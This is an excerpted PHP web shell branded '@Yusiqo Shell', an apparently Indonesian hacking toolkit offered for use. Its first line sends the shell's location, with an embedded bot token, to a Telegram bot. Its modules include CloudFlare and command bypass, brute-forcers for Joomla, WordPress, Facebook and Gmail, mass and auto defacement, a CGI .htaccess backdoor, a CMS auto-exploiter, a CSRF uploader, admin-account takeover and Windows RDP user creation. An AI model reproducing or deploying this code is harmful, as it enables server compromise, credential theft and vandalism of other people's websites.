...
file_get_contents("https://api.telegram.org/bot5505493552:AAGPsDwuSaDepUEs1IVIJ9oJ28W4LbhwNf0/sendMessage?chat_id=1342133634&text=".$actual_link);
...
<html>
<head>
	<link rel="SHORTCUT ICON" href="https://i.imgur.com/eWhUrlF_d.webp?maxwidth=640&shape=thumb&fidelity=medium">
<title>xXx::.@Yusiqo Shell.::xXx/title>
<style type="text/css">
html {
	background: #000000;
	color: green;
...
<center><div id="contenttengah"><center>
		<img title="@Yusiqo"src="https://i.imgur.com/eWhUrlF_d.webp?maxwidth=640&shape=thumb&fidelity=medium" width="70%"></div> </center>


<span class="style4"> Shell Programmer: <br>@Yusiqo</span><br><br>
<span class="style4">@Yusiqo: <br>SQL47.ID</span><br><br>
...
<font color = "red" face = "Iceland" size = "6">@Yusiqo Bypass</font><br><br><br>
...
<font color="#FFF000"> Users Found : <font color = 'red'>root@@Yusiqo:~$ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font></font><br>
<font color="lime"> Connecting To Our Master ^_^  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#F00000"><font color="#FFF000">root@@Yusiqo:~$</font> Connected ! </font><br>
...
<font color="red">root@@Yusiqo:~$ </font><font color="#FFF000"><?php echo "@". $ServerName ?><br></font><font color="red">Ready To Fuck Server :p</font>
</tr>
</tbody></table>
<br>
...
<head>
	<link rel="SHORTCUT ICON" href="https://i.imgur.com/eWhUrlF_d.webp?maxwidth=640&shape=thumb&fidelity=medium">
<title>xXx::. @Yusiqo Shell .::xXxx</title>
<meta name='author' content='@Yusiqo'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(http://fonts.googleapis.com/css?family=Iceland);
...
echo "<center>";
echo "<br>";
echo "<img src = 'https://i.imgur.com/eWhUrlF_d.webp?maxwidth=640&shape=thumb&fidelity=medium' width = '110' height = '110' id='spinner'></img>";
echo "&emsp;&emsp;&emsp;";
echo "<font size='20px' color='red' face = 'Rajdhani'>$ @Yusiqo Shell $</font>";
echo "&emsp;";
echo "<img src = 'https://i.imgur.com/eWhUrlF_d.webp?maxwidth=640&shape=thumb&fidelity=medium' width = '100' height = '100' id='spinner'></img>";
echo "<br><br>";
if($_POST['upload']) {
...
//Fungsi log dinonaktifkan oleh @Yusiqo
/*
$ch = curl_init();
...
<center/><br/><b><font color=white>-=[ Command  Bypass Exploit  By @Yusiqo ]=-</font></b><br>
<?php
print_r('
<pre>
...
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass CloudFlare By @Yusiqo ]=--+
</font></b></p>
...
function randomt() {
    ...
    */
    ...
    <center><br><br>
    <font color="white" size='+3'><b>+--=[ Automatic Joomla Index Changer By @Yusiqo ]=--+</b></font><br><br>
    </center>
    <center><b>
...
<form action="?dir=<?php echo $pwd; ?>&amp;do=jbrute" method="post">
    ...
    <meta name="description" content="@Yusiqo" />
<center>
</br></br>
<center><b><font color="lime">+--=[ Joomla Brute Force By @Yusiqo ]=--+</font></b><br /><br />
...
<center>
<br><Br><b><font size='2' >+--=[ Wordpress Brute Force  By @Yusiqo ]=--+</font><br>
...
?>
	...
	<br><br><center><b><font size=4>+--=[ Facebook BruteForce by @Yusiqo ]=--+</font></b></center><br><br>
	<?php
ob_start();
@set_time_limit(0);
#################################################
...
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>This Password Seems Working !Try It ^_^ by @Yusiqo|| Username: <font color='green'>$user</font>&nbsp; Password : <font color='green'>$pass</font></font></p>";
}
}            
...
<br>
<br>
<center><p><b><font size='2' face='Trebuchet MS' color='#FFFFFF'>Published by : @Yusiqo<br><font size='2' face='Trebuchet MS' color='#FFFFFF'>Coded by : @Yusiqo</font></b></p></center>";
}
...
?>
	...
	<br><br><center><b><font size=4>+--=[ Gmail BruteForce by @Yusiqo ]=--+</font></b></center><br>
	<center><span style="font-size:30px; font-family:Fredericka the Great; color:#1975FF">Gmail & Hotmail BruteForce @Yusiqo</span><center><br>
	<?php
   set_time_limit(0); 
error_reporting(0); 
...
echo"</textarea><br>ID: <input type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By @Yusiqo'><br>POST CONTENT: <input type='text' name='content' value='Hacked By @Yusiqo'><br>POSTNAME: <input type='text' name='postname' value='HackeD By @Yusiqo'><br>
...
if($_POST['edittitle']) {
	...
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgipy.@Yusiqo";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Index_@Yusiqo \n AddHandler cgi-script .Index_@Yusiqo \n AddHandler cgi-script .Index_@Yusiqo";
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgipy.@Yusiqo' target='_blank'>Klik Here</a>";
}
...
elseif($_GET['do'] == 'cgi') {
	...
	$file_cgi = "cgi.@Yusiqo";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .@Yusiqo \n AddHandler cgi-script .@Yusiqo \n AddHandler cgi-script .@Yusiqo";
	$htcgi = fopen(".htaccess", "w");
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi.@Yusiqo' target='_blank'>Klik Here</a>";
...
elseif($_GET['do'] == 'cgi2') {
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi2.@Yusiqo' target='_blank'>Klik Here</a>";
} 
	...
	foreach($domain as $url) {
		foreach($up as $user => $pass) {
			...
			if(preg_match("/Logout|Administrator/", $login)) {
				...
				$data2 = array(
					"judul" => "@Yusiqo Shell auto exploiter lokomedia",
					"fupload" => "@$file",
					"upload" => " &nbsp;&nbsp;&nbsp;&nbsp; Simpan &nbsp;&nbsp;&nbsp;&nbsp;",
					);
...
if($_POST['username'] and $_POST['password']){
        ...
        echo "<p align='center' dir='ltr'><font size='2'>Coded By : @Yusiqo, &amp; Recoded by @Yusiqo</font></p>";

} elseif($_GET['do'] == 'csrfup')
{	
echo '<html>
<center><h1 style="font-size:33px;">CSRF Exploiter By IndoXPloit<br>Recoded by @Yusiqo</h1><br><br>
...
<INPUT class=inputzbut type=submit value=setting name=send>
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By @Yusiqo</textarea><br>
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='@Yusiqo'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value=' @Yusiqo'><br>
		<u>Domains</u>: <br>
...
<?php
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='@Yusiqo' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='@Yusiqo' placeholder='pass_baru'><br>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by @Yusiqo' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='@Yusiqo'><br>
		<u>Domains</u>: <br>
...
echo "</center></table>";   
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by @Yusiqo' required><br>
...
";
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user @Yusiqo");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>@Yusiqo</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
			...
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='@Yusiqo' required>
			<input type='text' name='pass' placeholder='password' value='@Yusiqo' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
 ...
 elseif($_GET['act'] == 'rename_dir') {
	...
	echo "<center>Copyright &copy; ".date("Y")." <br><font color='red'>Shell By @Yusiqo";
	}
?> 
